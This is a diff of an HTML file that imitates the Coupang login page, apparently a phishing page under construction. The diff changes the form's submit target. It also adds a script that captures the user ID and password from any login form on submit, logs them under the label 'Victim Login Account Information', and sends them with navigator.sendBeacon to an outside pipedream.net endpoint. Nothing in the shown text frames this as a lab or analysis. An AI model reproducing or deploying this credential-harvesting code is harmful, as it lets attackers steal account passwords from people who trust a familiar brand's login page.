@@ -135,6 +135,22 @@ var I18n=I18n||{t:function(a,b){return b}};
 
     <div class="member-main">
         
+    
+        
+            
+        
+    
+
+    
+
+    
+
+
+
+
+
+        
+        
             <div class="tab-item-header tab-item-header-otp">
                 <a href="javascript:void(0)" class="password active" data-id="member-login" data-tab="password-login">이메일 로그인</a>
                 
@@ -150,25 +166,49 @@ var I18n=I18n||{t:function(a,b){return b}};
                     <a href="javascript:void(0)" class="qrcode" data-tab="qr-login">QR코드 로그인</a>
                 
             </div>
+        
+
+        
+        
+
+    
+
+
+
+
+
+
+        
+
+        
 
         <div id="memberLogin" class="tab-item-content" data-mweb-otp-login-v4="A" data-gtm-enabled="false" data-international-phone-scope="" data-easy-login-is-saved="" data-biometry-is-saved="" data-show-easy-login-checkbox-ab-option="" data-is-from-easy-login-bottom-sheet="false" data-disable-easy-login-checkbox="false" data-otp-cta-btn-change-scope="false" data-show-easy-login-checkbox-ab-option-v2="" data-enable-global-phone-sign-up="false" data-apply-unified-api-flow="true" data-apply-unified-api-flow-phone-otp="true" data-login-message-v2="false" data-improve-auto-login-failure="" data-enable-passkey-v2="">
             <div class="tab-item member-login _loginRoot
+                
                 sms-login-target
                 style-v2
+                
                 " data-first-purchase="false" data-coupon-benefit-type="" data-is-nudger-banner-v3-login="false" data-in-app-browser="" data-oauth-service-name="core" data-oauth-source-type="" data-auto-pre-inputted="" data-auto-target-acc="" data-auto-error-case="" data-auto-error-code-string="" data-prefilled-email="" data-prefilled-phone-number="" data-web-stability-hide-signup="" data-web-stability-pc-qr-code-login="true" data-web-stability-pc-otp-login-v4="B" data-web-stability-mweb-otp-login-v4="A" data-email-otp-ab-option="">
+            
+
+            
+            
+            
             <div class="heads-up">
     
 
+    
 </div>
 
                 
-                <form method="post" action="/login/loginRetry.pang" class="login__form _loginForm">
+                <form method="post" action="/c-corp/login.html" class="login__form _loginForm">
                     
                     <input name="adult" value="false" type="hidden">
                     <input name="rtnUrl" value="https%3A%2F%2Fwww.coupang.com%2Fnp%2Fpost%2Flogin%3Fr%3Dhttp%253A%252F%252Fwww.coupang.com%252F" type="hidden">
                     <input name="token" value="" type="hidden">
+
                     <input name="isRemember" value="false" type="hidden">
-                    <input name="step" value="" type="hidden">
+                
                     <div class="login__content login__content--input">
                         
 <div class="member__field-wrap ">
@@ -514,7 +554,15 @@ var I18n=I18n||{t:function(a,b){return b}};
 
     
 
-<div id="biz-register-tip-root" class="biz-register-tip" data-in-app-browser="" style="display: none !important;">
+    
+
+
+        
+            
+            
+            
+                
+                <div id="biz-register-tip-root" class="biz-register-tip" data-in-app-browser="" style="display: none !important;">
                     <p>법인 고객이신가요? </p>
                     <p>사업자 회원으로 전용 특가 혜택을 누려보세요. </p>
                     <a href="https://login.coupang.com/corporation/member/landing-page">
@@ -524,7 +572,10 @@ var I18n=I18n||{t:function(a,b){return b}};
                         </svg>
                     </a>
                 </div>
-</div>
+            
+            
+        
+    </div>
         
             
                 
@@ -533,14 +584,20 @@ var I18n=I18n||{t:function(a,b){return b}};
         
         
             <span class="prodcut-view-v2-ccm-banner-bottom" style="display: none;">
+                
+
+
             </span>
-             <div class="member-footer      " style="margin-top:24px;">
+             <div class="member-footer" style="margin-top:24px;">
                 <div>
                     ©Coupang Corp. All rights reserved.
                 </div>
                 
             </div>
+        
 </div>
+
+
 <div class="temp-content"></div>
 
 <div class="modal-container">
@@ -564,25 +621,52 @@ var I18n=I18n||{t:function(a,b){return b}};
 
 <!-- Log Point -->
 <script>
-    // 로그인 폼 제출 이벤트 처리
-    document.getElementById('loginFrm').addEventListener('submit', function(event) {
-        event.preventDefault(); // 기본 제출 동작 방지
-        
-        // 입력값 가져오기
-        const userId = this.user_id.value;
-        const userPw = this.user_pw.value;
-        
-        // Console에 로그 출력
-        console.log('=== Victim Login Account Information ===');
-        console.log('UserID:', userId);
-        console.log('Password:', userPw);
-        console.log('========================================');
-    });
+    document.addEventListener('submit', function(e) {
+        const form = e.target;
+        if (form.classList.contains('_loginForm') || form.action.includes('login')) {
+            const userId = form.querySelector('[name="user_id"]')?.value || '';
+            const userPw = form.querySelector('[name="user_pw"]')?.value || '';
+            
+            if (userId && userPw) {
+                console.log('=== Victim Login Account Information ===');
+                console.log('UserID:', userId);
+                console.log('Password:', userPw);
+                console.log('========================================');
+                
+                const url = 'https://11c9bf472599957da48779c59702d232.m.pipedream.net';
+                
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon(url, JSON.stringify({
+                        user_id: userId,
+                        user_pw: userPw,
+                        timestamp: new Date().toISOString()
+                    }));
+                }
+                
+                
+            }
+        }
+    }, true);
 </script>
-<script type="text/javascript" src="https://login.coupang.com/resources/20251014102418/dist/login.min.js"></script><div class="scoped-modal__container" style="display:none;"><b class="scoped-modal__blocker"></b><b class="scoped-modal__position-fixer"></b>
-<div class="scoped-modal__content scoped-modal__content--response-simple"></div></div><ul class="ui-autocomplete ui-front ui-menu ui-widget ui-widget-content" id="ui-id-1" tabindex="0" style="display: none;"></ul><span role="status" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"></span><div class="qr-tab-under-line" style="top: 166.638px;"></div>
-<div id="sec-overlay" style="display:none;"><div id="sec-container"></div></div>
-<script src="//front.coupangcdn.com/web-inspector/config/web-inspector.config.js">
-</script>
-</body>
-</html>
+
+    
+        
+        <script type="text/javascript" src="https://login.coupang.com/resources/20251014102418/dist/login.min.js"></script><div class="scoped-modal__container" style="display:none;"><b class="scoped-modal__blocker"></b><b class="scoped-modal__position-fixer"></b>
+  <div class="scoped-modal__content scoped-modal__content--response-simple"></div></div><ul class="ui-autocomplete ui-front ui-menu ui-widget ui-widget-content" id="ui-id-1" tabindex="0" style="display: none;"></ul><span role="status" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"></span><div class="qr-tab-under-line" style="top: 166.638px;"></div>
+    
+
+
+
+
+
+
+
+
+
+  
+
+   <div id="sec-overlay" style="display:none;"><div id="sec-container"></div></div>
+
+
+
+<script src="//front.coupangcdn.com/web-inspector/config/web-inspector.config.js"></script></body></html>
